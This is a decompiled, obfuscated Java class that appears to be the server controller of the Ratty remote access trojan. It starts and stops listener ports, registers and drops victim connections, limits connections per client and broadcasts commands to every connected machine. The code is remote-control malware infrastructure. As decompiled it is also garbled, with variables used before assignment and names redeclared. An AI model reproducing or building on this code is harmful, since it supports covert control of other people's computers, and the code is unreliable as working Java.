/*
 * Decompiled with CFR 0.150.
 */
package de.sogomn.rat.server;

import FuckingHackerToby.Da;
import FuckingHackerToby.Ka;
import FuckingHackerToby.j;
import FuckingHackerToby.ta;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.IServerObserver;
import java.util.ArrayList;
import java.util.Optional;

public abstract class AbstractRattyController
implements IServerObserver,
IConnectionObserver {
    private static final /* synthetic */ int ALLATORIxDEMO = 3;
    public /* synthetic */ ArrayList<ta> connections;
    public /* synthetic */ ArrayList<ActiveServer> servers;

    public /* synthetic */ AbstractRattyController() {
        AbstractRattyController a2;
        AbstractRattyController abstractRattyController = a2;
        a2.servers = new ArrayList();
        abstractRattyController.connections = new ArrayList();
    }

    public /* synthetic */ void startServer(int a22) {
        AbstractRattyController a3;
        if (a3.isServerStarted(a22)) {
            return;
        }
        ActiveServer a22 = new ActiveServer(a22);
        AbstractRattyController abstractRattyController = a3;
        a22.setObserver(abstractRattyController);
        a22.start();
        abstractRattyController.servers.add(a22);
    }

    @Override
    public /* synthetic */ void closed(ActiveServer a2) {
        AbstractRattyController a4;
        int n2 = a2.getPort();
        a4.connections.stream().filter(a3 -> a3.H() == n2).forEach(ta::close);
        a2.setObserver(null);
        a4.servers.remove(a2);
    }

    public /* synthetic */ void broadcast(j a2) {
        AbstractRattyController a4;
        a4.connections.forEach(a3 -> a3.H(a2));
    }

    private static /* synthetic */ boolean ALLATORIxDEMO(String a2, ta a3) {
        return a3.ALLATORIxDEMO().equals(a2);
    }

    public /* synthetic */ void stopServer(int a22) {
        AbstractRattyController a4;
        Optional<ActiveServer> a22 = a4.servers.stream().filter(a3 -> a3.getPort() == a22).findFirst();
        if (!a22.isPresent()) {
            return;
        }
        Optional<ActiveServer> optional = a22 = a22.get();
        ((ActiveServer)((Object)optional)).setObserver(null);
        ((ActiveServer)((Object)optional)).close();
        a4.servers.remove(a22);
    }

    public /* synthetic */ boolean isServerStarted(int a2) {
        AbstractRattyController a4;
        return a4.servers.stream().filter(a3 -> a3.getPort() == a2).findAny().isPresent();
    }

    @Override
    public /* synthetic */ void disconnected(ta a2) {
        AbstractRattyController a3;
        a3.connections.remove(a2);
        a2.ALLATORIxDEMO((IConnectionObserver)null);
    }

    @Override
    public /* synthetic */ void connected(ActiveServer a2, ta a3) {
        AbstractRattyController a4;
        a2 = a3.ALLATORIxDEMO();
        if (a4.connections.stream().filter(arg_0 -> AbstractRattyController.ALLATORIxDEMO((String)a2, arg_0)).count() >= 3L) {
            a2 = new Da();
            ta ta2 = a3;
            ta2.D();
            ta2.H((j)a2);
            return;
        }
        a2 = new Ka();
        AbstractRattyController abstractRattyController = a4;
        a3.ALLATORIxDEMO(abstractRattyController);
        abstractRattyController.connections.add(a3);
        ta ta3 = a3;
        ta3.D();
        ta3.H((j)a2);
    }
}

